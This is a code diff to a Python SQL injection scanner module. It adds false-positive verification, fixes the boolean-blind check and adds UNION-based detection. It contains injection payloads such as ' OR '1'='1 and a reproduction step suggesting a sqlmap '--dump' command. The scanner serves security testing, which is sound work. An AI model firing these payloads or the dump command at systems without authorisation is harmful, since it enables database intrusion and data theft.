@@ -12,6 +12,7 @@ sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
 
 from common.base_module import BaseModule, ModuleResult
 from common.finding import Severity
+from common.fp_reducer import FPReducer, Confidence
 
 PAYLOADS_ERROR = [
     "'", '"', "';", '";', "' OR '1'='1", '" OR "1"="1',
@@ -140,6 +141,13 @@ class SqliScanner(BaseModule):
             return self._make_result(start, skipped=True, skip_reason="out of scope")
 
         self.log.info("Starting SQL injection scan on %s", target)
+        # Initialise FPReducer — binds ForgeCollab OOB client when available
+        self._fp = FPReducer(
+            collab_client=self.config.extra.get("collab_client"),
+            headers=self.config.extra.get("session_headers", {}),
+            time_delay=5.0,
+            baseline_n=3,
+        )
 
         from webforge.core.session import ForgeSession
         async with ForgeSession(
@@ -343,6 +351,16 @@ class SqliScanner(BaseModule):
                 body = await resp.text()
                 db_type = self._detect_db_error(body)
                 if db_type:
+                    # FPReducer: run 3-layer verification before reporting
+                    fp_result = await self._fp.verify(
+                        "sqli_error", url, param, method="GET", payloads=[payload, "''"]
+                    )
+                    if not self._fp.should_report(fp_result):
+                        self.log.debug(
+                            "SQLi error-based suppressed by FPReducer (%s): %s[%s]",
+                            fp_result.confidence.value, url, param,
+                        )
+                        continue
                     finding_id = f"sqli_{param}_{db_type}".replace(" ", "_")
                     screenshot_path = self.capture_screenshot(
                         test_url, finding_id,
@@ -353,7 +371,11 @@ class SqliScanner(BaseModule):
                         request_raw=f"GET {test_url}",
                         response_raw=body[:2000],
                         screenshot_path=screenshot_path,
-                        extra={"payload": payload, "param": param, "db_type": db_type},
+                        extra={
+                            "payload": payload, "param": param, "db_type": db_type,
+                            "fp_confidence": fp_result.confidence.value,
+                            "fp_evidence": fp_result.evidence,
+                        },
                     )
                     self.new_finding(
                         title=f"SQL Injection — Parameter '{param}' ({db_type})",
@@ -407,8 +429,8 @@ class SqliScanner(BaseModule):
         if true_bodies and false_bodies:
             true_avg  = sum(len(b) for b in true_bodies) / len(true_bodies)
             false_avg = sum(len(b) for b in false_bodies) / len(false_bodies)
-            # Significant size difference between TRUE and FALSE conditions
-            if abs(true_avg - false_avg) > 50 and abs(true_avg - baseline_len) < abs(false_avg - baseline_len):
+            # TRUE condition should diverge from baseline; FALSE should stay close
+            if abs(true_avg - false_avg) > 50 and abs(true_avg - baseline_len) > abs(false_avg - baseline_len):
                 from common.evidence import Evidence
                 ev = Evidence(
                     request_raw=f"GET {self._inject_param(url, param, PAYLOADS_BOOLEAN_TRUE[0])}",
@@ -445,7 +467,47 @@ class SqliScanner(BaseModule):
                 )
                 return
 
-        # 3. Time-based blind detection
+        # 3. UNION-based detection — probe column count then check for marker in response
+        union_marker = "forge_sqli_union_marker"
+        for payload in PAYLOADS_UNION:
+            await self.rate_limit()
+            marked = payload.replace("'sqli'", f"'{union_marker}'").replace("1,2,3", f"1,'{union_marker}',3")
+            test_url = self._inject_param(url, param, marked)
+            try:
+                resp = await session.get(test_url)
+                body = await resp.text()
+                if union_marker in body:
+                    from common.evidence import Evidence
+                    ev = Evidence(
+                        request_raw=f"GET {test_url}",
+                        response_raw=body[:500],
+                        extra={"payload": marked, "param": param, "marker_found": True},
+                    )
+                    self.new_finding(
+                        title=f"UNION-Based SQL Injection — Parameter '{param}'",
+                        severity=Severity.CRITICAL,
+                        description=(
+                            f"UNION-based SQL injection in parameter '{param}'. "
+                            f"Payload '{marked}' reflected marker '{union_marker}' in response, "
+                            "confirming query column count and data extraction capability."
+                        ),
+                        reproduction_steps=[
+                            f"curl '{test_url}'",
+                            f"# Automate: sqlmap -u '{url}' -p {param} --technique=U --dump",
+                        ],
+                        remediation="Use parameterized queries for all database operations.",
+                        references=["CWE-89", "OWASP A03:2021"],
+                        evidence=ev,
+                        cvss_v31_vector=CVSS_SQLI,
+                        cvss_v40_vector=CVSS40_SQLI,
+                        mitre_attack=["TA0006/T1190"],
+                        target=test_url,
+                    )
+                    return
+            except Exception:
+                pass
+
+        # 4. Time-based blind detection
         for payload in PAYLOADS_TIME:
             await self.rate_limit()
             test_url = self._inject_param(url, param, payload)
@@ -455,10 +517,24 @@ class SqliScanner(BaseModule):
                 await resp.text()
                 elapsed = time.monotonic() - t_start
                 if elapsed >= 4.5:  # 5s sleep with 0.5s tolerance
+                    # FPReducer: re-probe with variant payloads to confirm time delay is genuine
+                    fp_result = await self._fp.verify(
+                        "sqli_time", url, param, method="GET"
+                    )
+                    if not self._fp.should_report(fp_result):
+                        self.log.debug(
+                            "SQLi time-based suppressed by FPReducer (%s): %s[%s]",
+                            fp_result.confidence.value, url, param,
+                        )
+                        continue
                     from common.evidence import Evidence
                     ev = Evidence(
                         request_raw=f"GET {test_url}",
-                        extra={"payload": payload, "param": param, "delay_s": round(elapsed, 2)},
+                        extra={
+                            "payload": payload, "param": param, "delay_s": round(elapsed, 2),
+                            "fp_confidence": fp_result.confidence.value,
+                            "fp_evidence": fp_result.evidence,
+                        },
                     )
                     self.new_finding(
                         title=f"Blind SQL Injection (Time-Based) — Parameter '{param}'",
